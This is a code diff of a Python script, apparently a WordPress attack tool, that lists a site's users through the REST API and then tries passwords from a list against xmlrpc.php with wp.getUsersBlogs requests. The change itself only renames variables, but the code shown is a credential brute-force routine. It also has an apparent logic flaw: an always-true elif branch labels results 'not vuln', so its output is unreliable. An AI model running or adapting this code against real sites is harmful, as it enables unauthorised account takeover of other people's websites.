@@ -45,8 +45,8 @@ for N, line in enumerate(x.split("\n")):
 def gaskeun(url, password):
 	bl = url+'/xmlrpc.php'
 	url = url+"/wp-json/wp/v2/users/"
-	tolol = requests.get(url).text
-	kon = json.loads(tolol)
+	reks1 = requests.get(url).text
+	kon = json.loads(reks1)
 	#get user
 	try:
 		for y in kon:
@@ -56,8 +56,8 @@ def gaskeun(url, password):
 			for c in mewek:
 				n = c.strip()
 				body = ("""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""" .format(bla,n))
-				kontil = requests.post(bl, data=body)
-				if 'faultString' in kontil.text:
+				reks2 = requests.post(bl, data=body)
+				if 'faultString' in reks2.text:
 					print('{}[ {}not vuln {}] {}{} {}[ {}{} {}] {}[ {}{} {}]' .format(fg,fr,fg,fg,bl,fr,fg, bla,fr,fr,fg,n,fr))
 				elif '[]':
 					print('{}[ {}not vuln {}] {}{} {}[ {}{} {}] {}[ {}{} {}]' .format(fg,fr,fg,fg,bl,fr,fg ,bla,fr,fr,fg,n,fr))
